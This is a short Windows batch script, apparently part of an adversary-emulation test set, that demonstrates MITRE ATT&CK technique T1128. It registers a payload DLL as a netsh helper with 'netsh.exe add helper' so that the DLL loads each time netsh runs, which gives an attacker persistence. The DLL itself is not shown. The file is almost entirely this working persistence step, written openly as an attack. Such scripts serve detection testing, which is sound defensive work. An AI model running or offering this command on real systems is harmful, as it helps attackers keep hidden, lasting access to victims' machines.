@ECHO OFF
CLS
color 0E


ECHO ===========================================================================
ECHO Technique: Netsh Helper DLL	(T1128)
ECHO.
ECHO [+] Abuse 'Netshell' to acheive Persistence
ECHO -------------------------------------------------------------------
netsh.exe add helper %PAYLOAD%\T1128\T1128.dll
ECHO.

